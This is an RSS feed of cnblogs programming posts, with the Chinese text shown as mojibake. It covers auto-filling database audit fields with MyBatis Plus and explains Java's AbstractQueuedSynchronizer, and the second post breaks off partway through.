<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>åšå®¢å›­_é¦–é¡µ</title>
<link></link>
<description>ä»£ç æ”¹å˜ä¸–ç•Œ</description>
<item>
<title>å¦‚ä½•è‡ªåŠ¨å¡«å……SQLè¯­å¥ä¸­çš„å…¬å…±å­—æ®µ - ç å†œå°èƒ–å“¥</title>
<link>http://www.cnblogs.com/felordcn/p/13752898.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/felordcn/p/13752898.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1739473/202009/1739473-20200930085622894-46215229.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-å‰è¨€&quot;&gt;1. å‰è¨€&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨è®¾è®¡æ•°æ®åº“çš„æ—¶å€™ä¸€å®šä¼šå¸¦ä¸Šæ–°å¢ã€æ›´æ–°çš„æ—¶é—´ã€æ“ä½œè€…ç­‰å®¡è®¡ä¿¡æ¯ã€‚ ä¹‹æ‰€ä»¥å¸¦è¿™äº›ä¿¡æ¯æ˜¯å› ä¸ºå‡å¦‚æœ‰ä¸€å¤©å…¬å¸çš„æ•°æ®åº“è¢«äººä¸ºåˆ äº†ï¼Œå°½ç®¡å¯èƒ½æœ‰æ•°æ®åº“å¤‡ä»½å¯ä»¥æ¢å¤æ•°æ®ã€‚ä½†æ˜¯æˆ‘ä»¬ä»ç„¶éœ€è¦è¿½è¸ªåˆ°è¿™ä¸ªäº‹æ˜¯è°å¹²çš„ï¼Œåœ¨ä»€ä¹ˆæ—¶é—´å¹²çš„ï¼Œå…·ä½“å¹²äº†å“ªäº›äº‹ç­‰ç­‰ï¼Œæ–¹ä¾¿å®šè´£å’Œä¿®è¡¥ã€‚ä½†æ˜¯æˆ‘ä»¬å˜æ›´æ¯æ¡æ•°æ®éƒ½è¦å»æ˜¾å¼å˜æ›´è¿™äº›ä¿¡æ¯å°±ååˆ†ç¹çï¼Œæˆ‘ä»¬å¸Œæœ›æ— æ„ŸçŸ¥çš„æ¥å¤„ç†è¿™äº›ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h2 id=&quot;2-é€šç”¨æ–¹å¼&quot;&gt;2. é€šç”¨æ–¹å¼&lt;/h2&gt;
&lt;p&gt;é‚£ä¹ˆæœ‰ä»€ä¹ˆå¥½çš„è§£å†³æ€è·¯å‘¢ï¼Ÿåœ¨&lt;strong&gt;Spring Data&lt;/strong&gt;æ¡†æ¶ä¸­æä¾›&lt;code&gt;@CreatedBy&lt;/code&gt;å’Œ&lt;code&gt;@LastModifiedBy&lt;/code&gt;æ¥æ•æ‰è°åˆ›å»ºæˆ–ä¿®æ”¹çš„å®ä½“ä»¥åŠ&lt;code&gt;@CreatedDate&lt;/code&gt;å’Œ&lt;code&gt;@LastModifiedDate&lt;/code&gt;æ¥æ•æ‰åˆé€‚åˆ›å»ºæˆ–ä¿®æ”¹äº†å®ä½“ã€‚å¦‚æœä½ ä½¿ç”¨ç›¸å…³çš„æ¡†æ¶å°±å¯ä»¥ä½¿ç”¨è¿™äº›ç‰¹æ€§ã€‚é‚£ä¹ˆå…¶å®æˆ‘ä»¬çŸ¥é“å›½å†…&lt;strong&gt;Spring Data JDBC&lt;/strong&gt;ã€&lt;strong&gt;Spring Data JPA&lt;/strong&gt;å¹¶ä¸æ˜¯ä¸»æµï¼Œä¸»æµçš„æ˜¯&lt;strong&gt;Mybatis&lt;/strong&gt;ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰å“ªäº›é€‰æ‹©ï¼Ÿ&lt;/p&gt;
&lt;h3 id=&quot;21-å¼€å‘mybatiså®¡è®¡æ’ä»¶&quot;&gt;2.1 å¼€å‘Mybatiså®¡è®¡æ’ä»¶&lt;/h3&gt;
&lt;p&gt;å¦‚æœä½ ä½¿ç”¨äº†åŸç”Ÿçš„&lt;strong&gt;Mybatis&lt;/strong&gt;å¯ä»¥ç¼–å†™ä¸€ä¸ªå®¡è®¡æ’ä»¶æ¥å®ç°è¿™äº›åŠŸèƒ½ã€‚æˆ‘åœ¨ä¹‹å‰è®²è§£è¿‡&lt;strong&gt;Mybatis&lt;/strong&gt;æ’ä»¶çš„æ•™ç¨‹ï¼Œå¹¶ä¸æ˜¯éå¸¸éš¾çš„äº‹ã€‚å¦‚æœä½ æƒ³æ‹¿æ¥å°±ç”¨ï¼Œå…¶å®&lt;strong&gt;GitHub&lt;/strong&gt;ä¸Šæä¾›äº†å¾ˆå¤šå¯ä¾›é€‰æ‹©çš„&lt;strong&gt;Mybatis&lt;/strong&gt;å®¡è®¡ç»„ä»¶ï¼Œæœ¬æ¥æˆ‘æ‰“ç®—æ‰‹å†™ä¸€ä¸ªï¼Œä½†æ˜¯ç¡®å®äººå®¶å†™çš„å¥½ã€‚ä½ å¯ä»¥é€šè¿‡å…³é”®è¯&lt;strong&gt;Mybatis Audit&lt;/strong&gt;æ¥æœç´¢åˆ°å®ƒä»¬é€‰æ‹©ä¸€æ¬¾æœ€é€‚åˆä½ çš„ã€‚&lt;/p&gt;
&lt;h3 id=&quot;22-mybatis-plus-è‡ªåŠ¨å¡«å……&quot;&gt;2.2 Mybatis Plus è‡ªåŠ¨å¡«å……&lt;/h3&gt;
&lt;p&gt;å¦‚æœä½ ä½¿ç”¨äº†&lt;strong&gt;Mybatis Plus&lt;/strong&gt;ï¼Œå¯ä»¥å€ŸåŠ©äºå…¶è‡ªåŠ¨å¡«å……åŠŸèƒ½æ¥å®ç°ã€‚&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;åŸºäº &lt;strong&gt;Mybatis Plus 3.3.0&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åªéœ€è¦å®ç°&lt;code&gt;MetaObjectHandler&lt;/code&gt;æ¥å£ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class MybatisAuditHandler implements MetaObjectHandler {
    @Override
    public void insertFill(MetaObject metaObject) {
        // å£°æ˜è‡ªåŠ¨å¡«å……å­—æ®µçš„é€»è¾‘ã€‚
        String userId = AuthHolder.getCurrentUserId();
        this.strictInsertFill(metaObject,&quot;creator&quot;,String.class, userId);
        this.strictInsertFill(metaObject,&quot;createTime&quot;, LocalDateTime.class,LocalDateTime.now());
    }

    @Override
    public void updateFill(MetaObject metaObject) {
        // å£°æ˜è‡ªåŠ¨å¡«å……å­—æ®µçš„é€»è¾‘ã€‚
        String userId = AuthHolder.getCurrentUserId();
        this.strictUpdateFill(metaObject,&quot;updater&quot;,String.class,userId);
        this.strictUpdateFill(metaObject,&quot;updateTime&quot;, LocalDateTime.class,LocalDateTime.now());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬æ‰©å±•ä¸€ä¸‹&lt;strong&gt;Mybatis Plus&lt;/strong&gt;çš„&lt;code&gt;Model&amp;lt;T&amp;gt;&lt;/code&gt;æŠŠå…¬å…±å®¡è®¡å­—æ®µæ”¾è¿›å»å¹¶å£°æ˜å¯¹åº”çš„å¡«å……ç­–ç•¥ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class BaseEntity&amp;lt;T extends Model&amp;lt;?&amp;gt;&amp;gt; extends Model&amp;lt;T&amp;gt; {

    @TableField(fill = FieldFill.INSERT)
    private String creator;
    @TableField(fill = FieldFill.INSERT)
    private LocalDateTime addTime;
    @TableField(fill = FieldFill.UPDATE)
    private String updater;
    @TableField(fill = FieldFill.UPDATE)
    private LocalDateTime updateTime;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æœ€åæˆ‘ä»¬çš„å®ä½“ç±»ä¸å†ç›´æ¥ç»§æ‰¿&lt;code&gt;Model&amp;lt;T&amp;gt;&lt;/code&gt;æ”¹ä¸ºä¸Šé¢çš„&lt;code&gt;BaseEntity&amp;lt;T&amp;gt;&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Data
@EqualsAndHashCode(callSuper = false)
public class UserInfo extends BaseEntity&amp;lt;UserInfo&amp;gt; {
    @TableId(value = &quot;user_id&quot;, type = IdType.ASSIGN_ID)
    private String userId;
    private String username;

    @Override
    protected Serializable pkVal() {
        return this.userId;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨å†å…³å¿ƒè¿™å‡ ä¸ªå…¬å…±å­—æ®µäº†ï¼Œå½“ç„¶ä½ å¯ä»¥æ ¹æ®éœ€è¦æ·»åŠ æ›´å¤šä½ éœ€è¦å¡«å……çš„å­—æ®µã€‚&lt;/p&gt;
&lt;h2 id=&quot;3-æ€»ç»“&quot;&gt;3. æ€»ç»“&lt;/h2&gt;
&lt;p&gt;ä»Šå¤©æˆ‘ä»¬SQLå®¡è®¡ä¸­çš„ä¸€äº›å…¬å…±å­—æ®µçš„è‡ªåŠ¨å¡«å……çš„å¸¸ç”¨æ–¹æ¡ˆè¿›è¡Œäº†ä¸€äº›ä»‹ç»ï¼Œç‰¹åˆ«å¯¹&lt;strong&gt;Mybatis Plus&lt;/strong&gt;æä¾›çš„åŠŸèƒ½è¿›è¡Œäº†ä»‹ç»ç›¸ä¿¡èƒ½å¤Ÿå¸®åŠ©ä½ ç®€åŒ–ä¸€äº›æ ·æ¿ä»£ç çš„ç¼–å†™ã€‚ä½†æ˜¯SQLå®¡è®¡å¹¶ä¸ä»…ä»…è¿™ä¹ˆç®€å•ï¼Œæ ¹æ®ä½ çš„ä¸šåŠ¡çš„ä¸åŒä¼šæœ‰ä¸åŒçš„è®¾è®¡ã€‚å¦‚æœè®¾è®¡çš„æ›´åŠ ç²¾ç»†åŒ–çš„è¯ï¼Œä¼šé€šè¿‡é•œåƒæˆ–æ¢é’ˆçš„æ–¹å¼é‡‡é›†æ‰€æœ‰æ•°æ®åº“çš„è®¿é—®æµé‡ï¼Œå¹¶åŸºäºSQLè¯­æ³•ã€è¯­ä¹‰çš„è§£ææŠ€æœ¯ï¼Œè®°å½•ä¸‹æ•°æ®åº“çš„æ‰€æœ‰è®¿é—®å’Œæ“ä½œè¡Œä¸ºã€‚æœ‰ç©ºå¯ä»¥ä»ç½‘ä¸Šè·å–ç›¸å…³çš„èµ„æ–™è¿›è¡Œäº†è§£ã€‚ä»Šå¤©å°±åˆ°è¿™é‡Œï¼Œå…³æ³¨ï¼š&lt;strong&gt;ç å†œå°èƒ–å“¥&lt;/strong&gt;ï¼Œè·å–æ›´å¤šçš„ç¼–ç¨‹å®æˆ˜å¹²è´§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;å…³æ³¨å…¬ä¼—å·ï¼šFelordcn è·å–æ›´å¤šèµ„è®¯&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://felord.cn&quot;&gt;ä¸ªäººåšå®¢ï¼šhttps://felord.cn&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 30 Sep 2020 00:56:00 +0000</pubDate>
<dc:creator>ç å†œå°èƒ–å“¥</dc:creator>
<og:description>1. å‰è¨€ æˆ‘ä»¬åœ¨è®¾è®¡æ•°æ®åº“çš„æ—¶å€™ä¸€å®šä¼šå¸¦ä¸Šæ–°å¢ã€æ›´æ–°çš„æ—¶é—´ã€æ“ä½œè€…ç­‰å®¡è®¡ä¿¡æ¯ã€‚ ä¹‹æ‰€ä»¥å¸¦è¿™äº›ä¿¡æ¯æ˜¯å› ä¸ºå‡å¦‚æœ‰ä¸€å¤©å…¬å¸çš„æ•°æ®åº“è¢«äººä¸ºåˆ äº†ï¼Œå°½ç®¡å¯èƒ½æœ‰æ•°æ®åº“å¤‡ä»½å¯ä»¥æ¢å¤æ•°æ®ã€‚ä½†æ˜¯æˆ‘ä»¬ä»ç„¶éœ€è¦è¿½è¸ªåˆ°è¿™ä¸ªäº‹</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/felordcn/p/13752898.html</dc:identifier>
</item>
<item>
<title>ä½ æ¥è®²è®²AQSæ˜¯ä»€ä¹ˆå§ï¼Ÿéƒ½æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ - çºªè«</title>
<link>http://www.cnblogs.com/jimoer/p/13747291.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jimoer/p/13747291.html</guid>
<description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;åœ¨Javaé¢è¯•çš„æ—¶å€™ï¼Œå¤šçº¿ç¨‹ç›¸å…³çš„çŸ¥è¯†æ˜¯èº²ä¸æ‰çš„ï¼Œè‚¯å®šä¼šè¢«é—®ã€‚æˆ‘å°±è¢«é—®åˆ°äº†AQSçš„çŸ¥è¯†ï¼Œå°±ç›´æ¥äº†å½“çš„é—®ï¼ŒAQSçŸ¥é“æ˜¯ä»€ä¹ˆå§ï¼Œæ¥è®²è®²å®ƒæ˜¯æ€ä¹ˆå®ç°çš„ï¼Œä»¥åŠå“ªäº›åœ°æ–¹ç”¨åˆ°äº†å®ƒã€‚å½“æ—¶è‡ªå·±ç¡®å®æ²¡æœ‰è®²å¥½ï¼Œæ‰€ä»¥è¿™æ¬¡æ¥æ€»ç»“ä¸€ä¸‹è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ä»€ä¹ˆæ˜¯aqs&quot;&gt;ä»€ä¹ˆæ˜¯AQS&lt;/h2&gt;
&lt;p&gt;AQSå…¨ç§°æ˜¯&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;ï¼Œå½¢å¦‚å…¶åï¼ŒæŠ½è±¡é˜Ÿåˆ—åŒæ­¥å™¨ã€‚&lt;br/&gt;AQSå®šä¹‰äº†ä¸¤ç§èµ„æºå…±äº«æ¨¡å¼ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;ç‹¬å å¼ï¼Œæ¯æ¬¡åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”ï¼Œä¾‹å¦‚&lt;code&gt;ReentrantLock&lt;/code&gt;å®ç°çš„å°±æ˜¯ç‹¬å å¼çš„é”èµ„æºã€‚&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å…±äº«å¼ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è·å–é”ï¼Œå¹¶å‘è®¿é—®å…±äº«èµ„æºï¼Œ&lt;code&gt;ReentrantWriteLock&lt;/code&gt;å’Œ&lt;code&gt;CountDownLatch&lt;/code&gt;ç­‰å°±æ˜¯å®ç°çš„è¿™ç§æ¨¡å¼ã€‚&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;å®ƒç»´æŠ¤äº†ä¸€ä¸ª&lt;code&gt;volatile&lt;/code&gt;çš„&lt;code&gt;state&lt;/code&gt;å˜é‡å’Œä¸€ä¸ªFIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰çš„é˜Ÿåˆ—ã€‚&lt;br/&gt;å…¶ä¸­&lt;code&gt;state&lt;/code&gt;å˜é‡ä»£è¡¨çš„æ˜¯ç«äº‰èµ„æºæ ‡è¯†ï¼Œè€Œé˜Ÿåˆ—ä»£è¡¨çš„æ˜¯ç«äº‰èµ„æºå¤±è´¥çš„çº¿ç¨‹æ’é˜Ÿæ—¶å­˜æ”¾çš„å®¹å™¨ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class AbstractQueuedSynchronizer extends AbstractOwnableSynchronizer implements java.io.Serializable {
        ...
        /**
         * The synchronization state.
         */
        private volatile int state;
        /**
     * Wait queue node class.
     **/
     static final class Node {
                ...
        }
        ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;AQSä¸­æä¾›äº†æ“ä½œstateçš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;getState();&lt;/li&gt;
&lt;li&gt;setState();&lt;/li&gt;
&lt;li&gt;compareSetState();&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final int getState() {
    return state;
}
protected final void setState(int newState) {
    state = newState;
}
protected final boolean compareAndSetState(int expect, int update) {
    // See below for intrinsics setup to support this
    return unsafe.compareAndSwapInt(this, stateOffset, expect, update);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å› ä¸º&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä»–é‡‡ç”¨&lt;strong&gt;æ¨¡æ¿æ–¹æ³•&lt;/strong&gt;çš„è®¾è®¡æ¨¡å¼ï¼Œè§„å®šäº†&lt;strong&gt;ç‹¬å &lt;/strong&gt;å’Œ&lt;strong&gt;å…±äº«&lt;/strong&gt;æ¨¡å¼éœ€è¦å®ç°çš„æ–¹æ³•ï¼Œå¹¶ä¸”å°†ä¸€äº›é€šç”¨çš„åŠŸèƒ½å·²ç»è¿›è¡Œäº†å®ç°ï¼Œæ‰€ä»¥ä¸åŒæ¨¡å¼çš„ä½¿ç”¨æ–¹å¼ï¼Œåªéœ€è¦è‡ªå·±å®šä¹‰å¥½å®ç°å…±äº«èµ„æºçš„è·å–ä¸é‡Šæ”¾å³å¯ï¼Œè‡³äºå…·ä½“çº¿ç¨‹åœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ç»´æŠ¤ï¼ˆè·å–èµ„æºå…¥é˜Ÿåˆ—ã€å”¤é†’å‡ºé˜Ÿåˆ—ç­‰ï¼‰ï¼ŒAQSå·²ç»å®ç°å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ ¹æ®å…±äº«èµ„æºçš„æ¨¡å¼ä¸€èˆ¬å®ç°çš„æ–¹æ³•æœ‰å¦‚ä¸‹å‡ ä¸ªï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;isHeldExclusively()ï¼›&lt;/code&gt;// æ˜¯å¦ä¸ºç‹¬å æ¨¡å¼ï¼›ä½†æ˜¯åªæœ‰ä½¿ç”¨åˆ°äº†Conditionçš„ï¼Œæ‰éœ€è¦å»å®ç°å®ƒã€‚ä¾‹å¦‚ï¼šReentrantLockã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryAcquire(int arg);&lt;/code&gt; // ç‹¬å æ¨¡å¼ï¼›å°è¯•è·å–èµ„æºï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryRelease(int arg) ;&lt;/code&gt; // ç‹¬å æ¨¡å¼ï¼›å°è¯•é‡Šæ”¾èµ„æºï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;int tryAcquireShared(int arg);&lt;/code&gt; // å…±äº«æ¨¡å¼ï¼›å°è¯•è·å–èµ„æºï¼Œè´Ÿæ•°è¡¨ç¤ºå¤±è´¥ï¼›0è¡¨ç¤ºæˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å‰©ä½™å¯ç”¨èµ„æºäº†ï¼›æ­£æ•°è¡¨ç¤ºæˆåŠŸï¼Œä¸”æœ‰å‰©ä½™å¯ç”¨èµ„æºã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryReleaseShared(int arg) ;&lt;/code&gt; // å…±äº«æ¬§å¼ï¼›å°è¯•é‡Šæ”¾èµ„æºï¼Œè‹¥é‡Šæ”¾èµ„æºåå…è®¸å”¤é†’åç»­ç­‰å¾…èŠ‚ç‚¹è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;ä¸Šé¢çš„è¿™å‡ ä¸ªæ–¹æ³•åœ¨&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;è¿™ä¸ªæŠ½è±¡ç±»ä¸­ï¼Œéƒ½æ²¡æœ‰è¢«å®šä¹‰ä¸ºabstractçš„ï¼Œè¯´æ˜è¿™äº›æ–¹æ³•éƒ½æ˜¯å¯ä»¥æŒ‰éœ€å®ç°çš„ï¼Œå…±äº«æ¨¡å¼ä¸‹å¯ä»¥åªå®ç°å…±äº«æ¨¡å¼çš„æ–¹æ³•ï¼ˆä¾‹å¦‚&lt;code&gt;CountDownLatch&lt;/code&gt;ï¼‰ï¼Œç‹¬å æ¨¡å¼ä¸‹å¯ä»¥åªå®ç°ç‹¬å æ¨¡å¼çš„æ–¹æ³•ï¼ˆä¾‹å¦‚&lt;code&gt;ReentrantLock&lt;/code&gt;ï¼‰,ä¹Ÿæ”¯æŒä¸¤ç§éƒ½å®ç°ï¼Œä¸¤ç§æ¨¡å¼éƒ½ä½¿ç”¨ï¼ˆä¾‹å¦‚&lt;code&gt;ReentrantReadWriteLock&lt;/code&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;h2 id=&quot;aqsæºç åˆ†æ&quot;&gt;AQSæºç åˆ†æ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆç®€å•ä»‹ç»AQSçš„ä¸¤ç§æ¨¡å¼çš„å®ç°ç±»çš„ä»£è¡¨&lt;code&gt;ReentrantLock&lt;/code&gt;ï¼ˆ&lt;strong&gt;ç‹¬å æ¨¡å¼&lt;/strong&gt;ï¼‰å’Œ&lt;code&gt;CountDownLatch&lt;/code&gt;ï¼ˆ&lt;strong&gt;å…±äº«æ¨¡å¼&lt;/strong&gt;ï¼‰ï¼Œæ˜¯å¦‚ä½•æ¥å…±äº«èµ„æºçš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç„¶åå†è¯¦ç»†é€šè¿‡AQSçš„æºç æ¥åˆ†ææ•´ä¸ªå®ç°è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;åœ¨åˆå§‹åŒ–çš„æ—¶å€™state=0ï¼Œè¡¨ç¤ºèµ„æºæœªè¢«é”å®šã€‚å½“Açº¿ç¨‹æ‰§è¡Œ&lt;code&gt;lock()&lt;/code&gt;æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•ï¼Œå°†AQSä¸­é˜Ÿåˆ—çš„æ¨¡å¼è®¾ç½®ä¸ºç‹¬å ï¼Œå¹¶å°†ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºçº¿ç¨‹Aï¼Œä»¥åŠå°†&lt;code&gt;state+1&lt;/code&gt;ã€‚&lt;br/&gt;è¿™æ ·åœ¨çº¿ç¨‹Aæ²¡æœ‰é‡Šæ”¾é”å‰ï¼Œå…¶ä»–çº¿ç¨‹æ¥ç«äº‰é”ï¼Œè°ƒç”¨&lt;code&gt;tryAcquire()&lt;/code&gt;æ–¹æ³•æ—¶éƒ½ä¼šå¤±è´¥ï¼Œç„¶åç«äº‰é”å¤±è´¥çš„çº¿ç¨‹å°±ä¼šè¿›å…¥åˆ°é˜Ÿåˆ—ä¸­ã€‚å½“çº¿ç¨‹Aè°ƒç”¨æ‰§è¡Œ&lt;code&gt;unlock()&lt;/code&gt;æ–¹æ³•å°†&lt;code&gt;state=0&lt;/code&gt;åï¼Œå…¶ä»–çº¿ç¨‹æ‰æœ‰æœºä¼šè·å–é”ï¼ˆæ³¨æ„&lt;code&gt;ReentrantLock&lt;/code&gt;æ˜¯å¯é‡å…¥çš„ï¼ŒåŒä¸€çº¿ç¨‹å¤šæ¬¡è·å–é”æ—¶&lt;code&gt;state&lt;/code&gt;å€¼ä¼šè¿›è¡Œå’åŠ çš„ï¼Œåœ¨é‡Šæ”¾é”æ—¶ä¹Ÿè¦é‡Šæ”¾ç›¸åº”çš„æ¬¡æ•°æ‰ç®—å®Œå…¨é‡Šæ”¾äº†é”ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CountDownLatch&lt;/code&gt;ä¼šå°†ä»»åŠ¡åˆ†æˆNä¸ªå­çº¿ç¨‹å»æ‰§è¡Œï¼Œstateçš„åˆå§‹å€¼ä¹Ÿæ˜¯Nï¼ˆ&lt;code&gt;state&lt;/code&gt;ä¸å­çº¿ç¨‹æ•°é‡ä¸€è‡´ï¼‰ã€‚Nä¸ªå­çº¿ç¨‹æ˜¯å¹¶è¡Œæ‰§è¡Œçš„ï¼Œæ¯ä¸ªå­çº¿ç¨‹æ‰§è¡Œå®Œæˆå&lt;code&gt;countDown()&lt;/code&gt;ä¸€æ¬¡ï¼Œ&lt;code&gt;state&lt;/code&gt;ä¼šé€šè¿‡CASæ–¹å¼å‡1ã€‚ç›´åˆ°æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œæˆåï¼ˆ&lt;code&gt;state=0&lt;/code&gt;ï¼‰,ä¼šé€šè¿‡&lt;code&gt;unpark()&lt;/code&gt;æ–¹æ³•å”¤é†’ä¸»çº¿ç¨‹ï¼Œç„¶åä¸»çº¿ç¨‹å°±ä¼šä»&lt;code&gt;await()&lt;/code&gt;æ–¹æ³•è¿”å›ï¼Œç»§ç»­åç»­æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;ç‹¬å æ¨¡å¼åˆ†æ&quot;&gt;ç‹¬å æ¨¡å¼åˆ†æ&lt;/h3&gt;
&lt;p&gt;åœ¨AbstractQueuedSynchronizerçš„ç±»é‡Œé¢æœ‰ä¸€ä¸ªé™æ€å†…éƒ¨ç±»Nodeã€‚å®ƒä»£è¡¨çš„æ˜¯é˜Ÿåˆ—ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ã€‚&lt;br/&gt;å…¶ä¸­NodeèŠ‚ç‚¹æœ‰å¦‚ä¸‹å‡ ä¸ªå±æ€§ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// èŠ‚ç‚¹çš„çŠ¶æ€
volatile int waitStatus;
// å½“å‰èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹
volatile Node prev;
// å½“å‰èŠ‚ç‚¹çš„åä¸€ä¸ªèŠ‚ç‚¹
volatile Node next;
// å½“å‰èŠ‚ç‚¹ä¸­æ‰€åŒ…å«çš„çº¿ç¨‹å¯¹è±¡
volatile Thread thread;
// ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹
Node nextWaiter;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ¯ä¸ªå±æ€§ä»£è¡¨çš„ä»€ä¹ˆï¼Œå·²ç»å†™åœ¨ä»£ç æ³¨é‡Šä¸­äº†ã€‚å…¶ä¸­Nodeç±»ä¸­è¿˜æœ‰å‡ ä¸ªå¸¸é‡ï¼Œä»£è¡¨äº†å‡ ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€ï¼ˆ&lt;code&gt;waitStatus&lt;/code&gt;ï¼‰å€¼ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;       /** waitStatus value to indicate thread has cancelled */
        static final int CANCELLED =  1;
        /** waitStatus value to indicate successor's thread needs unparking */
        static final int SIGNAL    = -1;
        /** waitStatus value to indicate thread is waiting on condition */
        static final int CONDITION = -2;
        /**
         * waitStatus value to indicate the next acquireShared should
         * unconditionally propagate
         */
        static final int PROPAGATE = -3;
&lt;/code&gt;
&lt;/pre&gt;
